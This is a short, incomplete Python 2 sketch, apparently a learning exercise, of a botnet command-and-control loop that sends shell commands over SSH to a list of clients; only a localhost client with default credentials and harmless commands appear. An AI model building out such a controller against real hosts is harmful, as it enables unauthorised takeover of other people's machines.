#implementing a botnet
#Important concepts: A botnet is controlled by a Command & Control center
#pxssh works on Linux distro's
# We need to connect theh connect the command center to the client throuh some protocol 


def botnet_command(command):
    for client in botNET:
        output = client.send_command(command)
        print "Check the Output from: " + client.host
        print " " +  output

def addClient(host, user, password):
    client = Client(host, user, password)
    botNET.append(client)

botNET = []
addClient ('127.0.0.1', 'ubuntu', 'ubuntu')

#commands you might want to try on comprommised machine. 
botnet_command("uname -v")
botnet_command("ls -la")